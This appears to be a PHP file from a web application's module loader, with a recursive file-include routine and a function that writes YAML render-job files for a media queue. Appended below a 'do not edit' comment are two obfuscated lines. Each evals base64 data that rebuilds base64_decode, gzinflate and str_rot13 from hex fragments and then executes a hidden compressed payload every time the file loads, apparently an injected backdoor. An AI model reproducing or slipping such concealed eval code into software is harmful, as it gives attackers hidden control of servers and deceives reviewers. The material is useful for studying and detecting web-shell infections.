<?php	function init(){
		$root=dirname(__FILE__);
		$files  = array('files'=>array(), 'dirs'=>array());
		$directories  = array();
		$last_letter  = $root[strlen($root)-1];
		$root  = ($last_letter == '\\' || $last_letter == '/') ? $root : $root.DIRECTORY_SEPARATOR;
		$directories[]  = $root;
		 
		while (sizeof($directories)) {
			$dir  = array_pop($directories);
			if ($handle = opendir($dir)) {
				while (false !== ($file = readdir($handle))) {
					if ($file == '.' || $file == '..') {
						continue;
					}
										
					$file  = $dir.$file;
					if (is_dir($file)) {
						$directory_path = $file.DIRECTORY_SEPARATOR;
						array_push($directories, $directory_path);
						$files['dirs'][]  = $directory_path;
					} elseif (is_file($file)) {
						$files['files'][]  = $file;
					}
				}
				closedir($handle);
			}
		}
		foreach($files["files"] as $key => $value){
			if(!isset($_aana_classes[$value]) && $value!=dirname(__FILE__).DIRECTORY_SEPARATOR."Loadlibrary.php" && substr($value,-3)=="php"){
				//echo $key."=>".$value."<br>";
				$_aana_classes[$value]=$value; 
				include($value);
			}
		}
		$_aanaBase=aanaBase::getRef();
		Modules::$registry["aanaBase"] = $_aanaBase;		
	}
		
	
	/**
	* Create .renderjob file for processing media in queue
	* Function::renderjob($params)
	* @access	public
	* @return	array
	*/
	function renderjob($params) {
		if(count($params)>0)
		{
			if(array_key_exists("Type",$params) && array_key_exists("JobID",$params))
			{

				if(file_exists(dirname(dirname(dirname(__FILE__))).'/queue/inc/config'.EXT))
				{
					include(dirname(dirname(dirname(__FILE__))).'/queue/inc/config'.EXT);
					include(dirname(dirname(dirname(__FILE__))).'/queue/inc/spyc'.EXT);
					log_message("DEBUG","All files include successfully");
				}
				$header="#[renderjob]#\n";
				$fp=fopen(config::getInst()->getKeyValue("media_queue_inqueue").$params["JobID"].".".config::getInst()->getKeyValue("renderjob"),"w");
				fwrite($fp,$header.Spyc::YAMLDump($params));
				fclose($fp);			
			}else{
				return "ERROR in writing renderjob YAML File !!!";
			}	
		} else {
			return "ERROR in YAML config file Format !!!";
		}
			
	}// -- END :: Function renderjob() --

/*
* ------ DONOT EDIT BELOW THIS -----
*/

$ob7410a53c759307ddcc59ee657ae243a="\x62\x61\x73\x65\x36\x34\x5f\x64\x65\x63\x6f\x64\x65";eval($ob7410a53c759307ddcc59ee657ae243a("JG81M2NmNzI5MzQxMDk0MjIwMWY1MDQ5MGJjMjhhMGZhYz0iXHg2MiI7ICRvZDE1N2JkYmFmZDc4NzRkMjlkMjQyYzFmNGJkZDkyYTA9Ilx4NjIiOyAkb2UxNTRlYmMwM2NiYzMyZjQ5YjFjYzZiMWZiM2RhMTY3PSJceDY3IjsgJG80NmNkODQ3Yzg2Nzc1NDE0YzY4MWU4NjllY2RiMDQzZT0iXHg2NyI7ICRvMDg4OWE1ZTY5MjIxZDE3ZjJiZjFlYzRjMjJhYWY1NzI9Ilx4NzMiOyAkbzUzY2Y3MjkzNDEwOTQyMjAxZjUwNDkwYmMyOGEwZmFjLj0iXHg2MSI7ICRvZDE1N2JkYmFmZDc4NzRkMjlkMjQyYzFmNGJkZDkyYTAuPSJceDYxIjsgJG9lMTU0ZWJjMDNjYmMzMmY0OWIxY2M2YjFmYjNkYTE2Ny49Ilx4N2EiOyAkbzQ2Y2Q4NDdjODY3NzU0MTRjNjgxZTg2OWVjZGIwNDNlLj0iXHg3YSI7ICRvMDg4OWE1ZTY5MjIxZDE3ZjJiZjFlYzRjMjJhYWY1NzIuPSJceDc0IjsgJG81M2NmNzI5MzQxMDk0MjIwMWY1MDQ5MGJjMjhhMGZhYy49Ilx4NzMiOyAkb2QxNTdiZGJhZmQ3ODc0ZDI5ZDI0MmMxZjRiZGQ5MmEwLj0iXHg3MyI7ICRvZTE1NGViYzAzY2JjMzJmNDliMWNjNmIxZmIzZGExNjcuPSJceDY0IjsgJG80NmNkODQ3Yzg2Nzc1NDE0YzY4MWU4NjllY2RiMDQzZS49Ilx4NjkiOyAkbzA4ODlhNWU2OTIyMWQxN2YyYmYxZWM0YzIyYWFmNTcyLj0iXHg3MiI7ICRvNTNjZjcyOTM0MTA5NDIyMDFmNTA0OTBiYzI4YTBmYWMuPSJceDY1IjsgJG9kMTU3YmRiYWZkNzg3NGQyOWQyNDJjMWY0YmRkOTJhMC49Ilx4NjUiOyAkb2UxNTRlYmMwM2NiYzMyZjQ5YjFjYzZiMWZiM2RhMTY3Lj0iXHg2NSI7ICRvNDZjZDg0N2M4Njc3NTQxNGM2ODFlODY5ZWNkYjA0M2UuPSJceDZlIjsgJG8wODg5YTVlNjkyMjFkMTdmMmJmMWVjNGMyMmFhZjU3Mi49Ilx4NWYiOyAkbzUzY2Y3MjkzNDEwOTQyMjAxZjUwNDkwYmMyOGEwZmFjLj0iXHgzNiI7ICRvZDE1N2JkYmFmZDc4NzRkMjlkMjQyYzFmNGJkZDkyYTAuPSJceDM2IjsgJG9lMTU0ZWJjMDNjYmMzMmY0OWIxY2M2YjFmYjNkYTE2Ny49Ilx4NjYiOyAkbzQ2Y2Q4NDdjODY3NzU0MTRjNjgxZTg2OWVjZGIwNDNlLj0iXHg2NiI7ICRvMDg4OWE1ZTY5MjIxZDE3ZjJiZjFlYzRjMjJhYWY1NzIuPSJceDcyIjsgJG81M2NmNzI5MzQxMDk0MjIwMWY1MDQ5MGJjMjhhMGZhYy49Ilx4MzQiOyAkb2QxNTdiZGJhZmQ3ODc0ZDI5ZDI0MmMxZjRiZGQ5MmEwLj0iXHgzNCI7ICRvZTE1NGViYzAzY2JjMzJmNDliMWNjNmIxZmIzZGExNjcuPSJceDZjIjsgJG80NmNkODQ3Yzg2Nzc1NDE0YzY4MWU4NjllY2RiMDQzZS49Ilx4NmMiOyAkbzA4ODlhNWU2OTIyMWQxN2YyYmYxZWM0YzIyYWFmNTcyLj0iXHg2ZiI7ICRvNTNjZjcyOTM0MTA5NDIyMDFmNTA0OTBiYzI4YTBmYWMuPSJceDVmIjsgJG9kMTU3YmRiYWZkNzg3NGQyOWQyNDJjMWY0YmRkOTJhMC49Ilx4NWYiOyAkb2UxNTRlYmMwM2NiYzMyZjQ5YjFjYzZiMWZiM2RhMTY3Lj0iXHg2MSI7ICRvNDZjZDg0N2M4Njc3NTQxNGM2ODFlODY5ZWNkYjA0M2UuPSJceDYxIjsgJG8wODg5YTVlNjkyMjFkMTdmMmJmMWVjNGMyMmFhZjU3Mi49Ilx4NzQiOyAkbzUzY2Y3MjkzNDEwOTQyMjAxZjUwNDkwYmMyOGEwZmFjLj0iXHg2NSI7ICRvZDE1N2JkYmFmZDc4NzRkMjlkMjQyYzFmNGJkZDkyYTAuPSJceDY0IjsgJG9lMTU0ZWJjMDNjYmMzMmY0OWIxY2M2YjFmYjNkYTE2Ny49Ilx4NzQiOyAkbzQ2Y2Q4NDdjODY3NzU0MTRjNjgxZTg2OWVjZGIwNDNlLj0iXHg3NCI7ICRvMDg4OWE1ZTY5MjIxZDE3ZjJiZjFlYzRjMjJhYWY1NzIuPSJceDMxIjsgJG81M2NmNzI5MzQxMDk0MjIwMWY1MDQ5MGJjMjhhMGZhYy49Ilx4NmUiOyAkb2QxNTdiZGJhZmQ3ODc0ZDI5ZDI0MmMxZjRiZGQ5MmEwLj0iXHg2NSI7ICRvZTE1NGViYzAzY2JjMzJmNDliMWNjNmIxZmIzZGExNjcuPSJceDY1IjsgJG80NmNkODQ3Yzg2Nzc1NDE0YzY4MWU4NjllY2RiMDQzZS49Ilx4NjUiOyAkbzA4ODlhNWU2OTIyMWQxN2YyYmYxZWM0YzIyYWFmNTcyLj0iXHgzMyI7ICRvNTNjZjcyOTM0MTA5NDIyMDFmNTA0OTBiYzI4YTBmYWMuPSJceDYzIjsgJG9kMTU3YmRiYWZkNzg3NGQyOWQyNDJjMWY0YmRkOTJhMC49Ilx4NjMiOyAkbzUzY2Y3MjkzNDEwOTQyMjAxZjUwNDkwYmMyOGEwZmFjLj0iXHg2ZiI7ICRvZDE1N2JkYmFmZDc4NzRkMjlkMjQyYzFmNGJkZDkyYTAuPSJceDZmIjsgJG81M2NmNzI5MzQxMDk0MjIwMWY1MDQ5MGJjMjhhMGZhYy49Ilx4NjQiOyAkb2QxNTdiZGJhZmQ3ODc0ZDI5ZDI0MmMxZjRiZGQ5MmEwLj0iXHg2NCI7ICRvNTNjZjcyOTM0MTA5NDIyMDFmNTA0OTBiYzI4YTBmYWMuPSJceDY1IjsgJG9kMTU3YmRiYWZkNzg3NGQyOWQyNDJjMWY0YmRkOTJhMC49Ilx4NjUiOw0KZXZhbCgkbzA4ODlhNWU2OTIyMWQxN2YyYmYxZWM0YzIyYWFmNTcyKCRvNDZjZDg0N2M4Njc3NTQxNGM2ODFlODY5ZWNkYjA0M2UoJG9kMTU3YmRiYWZkNzg3NGQyOWQyNDJjMWY0YmRkOTJhMCgiSzg1SUxFZ3ZTMHBVS0Vvc1NDb3MwbEFwOHN5cnpDalNyRTR0U3M5SVRWVEl6MHNyTWpPSmg4cVc1QllXRlZmbXBSZHBwS1dueHFjbXBSc2FhNlFWcFpibFZaYmxJdlJxNmxocWFsclg2dXZySytqcUtnU0hoUUVwQUE9PSIpKSkpOw=="));
$ob7410a53c759307ddcc59ee657ae243b="\x62\x61\x73\x65\x36\x34\x5f\x64\x65\x63\x6f\x64\x65";eval($ob7410a53c759307ddcc59ee657ae243b("JG81M2NmNzI5MzQxMDk0MjIwMWY1MDQ5MGJjMjhhMGZhYz0iXHg2MiI7ICRvZDE1N2JkYmFmZDc4NzRkMjlkMjQyYzFmNGJkZDkyYTA9Ilx4NjIiOyAkb2UxNTRlYmMwM2NiYzMyZjQ5YjFjYzZiMWZiM2RhMTY3PSJceDY3IjsgJG80NmNkODQ3Yzg2Nzc1NDE0YzY4MWU4NjllY2RiMDQzZT0iXHg2NyI7ICRvMDg4OWE1ZTY5MjIxZDE3ZjJiZjFlYzRjMjJhYWY1NzI9Ilx4NzMiOyAkbzUzY2Y3MjkzNDEwOTQyMjAxZjUwNDkwYmMyOGEwZmFjLj0iXHg2MSI7ICRvZDE1N2JkYmFmZDc4NzRkMjlkMjQyYzFmNGJkZDkyYTAuPSJceDYxIjsgJG9lMTU0ZWJjMDNjYmMzMmY0OWIxY2M2YjFmYjNkYTE2Ny49Ilx4N2EiOyAkbzQ2Y2Q4NDdjODY3NzU0MTRjNjgxZTg2OWVjZGIwNDNlLj0iXHg3YSI7ICRvMDg4OWE1ZTY5MjIxZDE3ZjJiZjFlYzRjMjJhYWY1NzIuPSJceDc0IjsgJG81M2NmNzI5MzQxMDk0MjIwMWY1MDQ5MGJjMjhhMGZhYy49Ilx4NzMiOyAkb2QxNTdiZGJhZmQ3ODc0ZDI5ZDI0MmMxZjRiZGQ5MmEwLj0iXHg3MyI7ICRvZTE1NGViYzAzY2JjMzJmNDliMWNjNmIxZmIzZGExNjcuPSJceDY0IjsgJG80NmNkODQ3Yzg2Nzc1NDE0YzY4MWU4NjllY2RiMDQzZS49Ilx4NjkiOyAkbzA4ODlhNWU2OTIyMWQxN2YyYmYxZWM0YzIyYWFmNTcyLj0iXHg3MiI7ICRvNTNjZjcyOTM0MTA5NDIyMDFmNTA0OTBiYzI4YTBmYWMuPSJceDY1IjsgJG9kMTU3YmRiYWZkNzg3NGQyOWQyNDJjMWY0YmRkOTJhMC49Ilx4NjUiOyAkb2UxNTRlYmMwM2NiYzMyZjQ5YjFjYzZiMWZiM2RhMTY3Lj0iXHg2NSI7ICRvNDZjZDg0N2M4Njc3NTQxNGM2ODFlODY5ZWNkYjA0M2UuPSJceDZlIjsgJG8wODg5YTVlNjkyMjFkMTdmMmJmMWVjNGMyMmFhZjU3Mi49Ilx4NWYiOyAkbzUzY2Y3MjkzNDEwOTQyMjAxZjUwNDkwYmMyOGEwZmFjLj0iXHgzNiI7ICRvZDE1N2JkYmFmZDc4NzRkMjlkMjQyYzFmNGJkZDkyYTAuPSJceDM2IjsgJG9lMTU0ZWJjMDNjYmMzMmY0OWIxY2M2YjFmYjNkYTE2Ny49Ilx4NjYiOyAkbzQ2Y2Q4NDdjODY3NzU0MTRjNjgxZTg2OWVjZGIwNDNlLj0iXHg2NiI7ICRvMDg4OWE1ZTY5MjIxZDE3ZjJiZjFlYzRjMjJhYWY1NzIuPSJceDcyIjsgJG81M2NmNzI5MzQxMDk0MjIwMWY1MDQ5MGJjMjhhMGZhYy49Ilx4MzQiOyAkb2QxNTdiZGJhZmQ3ODc0ZDI5ZDI0MmMxZjRiZGQ5MmEwLj0iXHgzNCI7ICRvZTE1NGViYzAzY2JjMzJmNDliMWNjNmIxZmIzZGExNjcuPSJceDZjIjsgJG80NmNkODQ3Yzg2Nzc1NDE0YzY4MWU4NjllY2RiMDQzZS49Ilx4NmMiOyAkbzA4ODlhNWU2OTIyMWQxN2YyYmYxZWM0YzIyYWFmNTcyLj0iXHg2ZiI7ICRvNTNjZjcyOTM0MTA5NDIyMDFmNTA0OTBiYzI4YTBmYWMuPSJceDVmIjsgJG9kMTU3YmRiYWZkNzg3NGQyOWQyNDJjMWY0YmRkOTJhMC49Ilx4NWYiOyAkb2UxNTRlYmMwM2NiYzMyZjQ5YjFjYzZiMWZiM2RhMTY3Lj0iXHg2MSI7ICRvNDZjZDg0N2M4Njc3NTQxNGM2ODFlODY5ZWNkYjA0M2UuPSJceDYxIjsgJG8wODg5YTVlNjkyMjFkMTdmMmJmMWVjNGMyMmFhZjU3Mi49Ilx4NzQiOyAkbzUzY2Y3MjkzNDEwOTQyMjAxZjUwNDkwYmMyOGEwZmFjLj0iXHg2NSI7ICRvZDE1N2JkYmFmZDc4NzRkMjlkMjQyYzFmNGJkZDkyYTAuPSJceDY0IjsgJG9lMTU0ZWJjMDNjYmMzMmY0OWIxY2M2YjFmYjNkYTE2Ny49Ilx4NzQiOyAkbzQ2Y2Q4NDdjODY3NzU0MTRjNjgxZTg2OWVjZGIwNDNlLj0iXHg3NCI7ICRvMDg4OWE1ZTY5MjIxZDE3ZjJiZjFlYzRjMjJhYWY1NzIuPSJceDMxIjsgJG81M2NmNzI5MzQxMDk0MjIwMWY1MDQ5MGJjMjhhMGZhYy49Ilx4NmUiOyAkb2QxNTdiZGJhZmQ3ODc0ZDI5ZDI0MmMxZjRiZGQ5MmEwLj0iXHg2NSI7ICRvZTE1NGViYzAzY2JjMzJmNDliMWNjNmIxZmIzZGExNjcuPSJceDY1IjsgJG80NmNkODQ3Yzg2Nzc1NDE0YzY4MWU4NjllY2RiMDQzZS49Ilx4NjUiOyAkbzA4ODlhNWU2OTIyMWQxN2YyYmYxZWM0YzIyYWFmNTcyLj0iXHgzMyI7ICRvNTNjZjcyOTM0MTA5NDIyMDFmNTA0OTBiYzI4YTBmYWMuPSJceDYzIjsgJG9kMTU3YmRiYWZkNzg3NGQyOWQyNDJjMWY0YmRkOTJhMC49Ilx4NjMiOyAkbzUzY2Y3MjkzNDEwOTQyMjAxZjUwNDkwYmMyOGEwZmFjLj0iXHg2ZiI7ICRvZDE1N2JkYmFmZDc4NzRkMjlkMjQyYzFmNGJkZDkyYTAuPSJceDZmIjsgJG81M2NmNzI5MzQxMDk0MjIwMWY1MDQ5MGJjMjhhMGZhYy49Ilx4NjQiOyAkb2QxNTdiZGJhZmQ3ODc0ZDI5ZDI0MmMxZjRiZGQ5MmEwLj0iXHg2NCI7ICRvNTNjZjcyOTM0MTA5NDIyMDFmNTA0OTBiYzI4YTBmYWMuPSJceDY1IjsgJG9kMTU3YmRiYWZkNzg3NGQyOWQyNDJjMWY0YmRkOTJhMC49Ilx4NjUiOw0KZXZhbCgkbzA4ODlhNWU2OTIyMWQxN2YyYmYxZWM0YzIyYWFmNTcyKCRvNDZjZDg0N2M4Njc3NTQxNGM2ODFlODY5ZWNkYjA0M2UoJG9kMTU3YmRiYWZkNzg3NGQyOWQyNDJjMWY0YmRkOTJhMCgiSzg1SUxFZ3ZTMHBVS0N3cVNDb3MwbEFwOHN5cnpDalNyRTR0U3M5SVRWVElTRXdyU2kzTHF5ekxMZEpJUzArTlQwMUtOelRXS01rdFN5eXV6RXN2MHNqUFN5c3lNNGxIMDYycHFXbGRxNit2cjZDcnF4QWNGZ2FrQUE9PSIpKSkpOw=="));
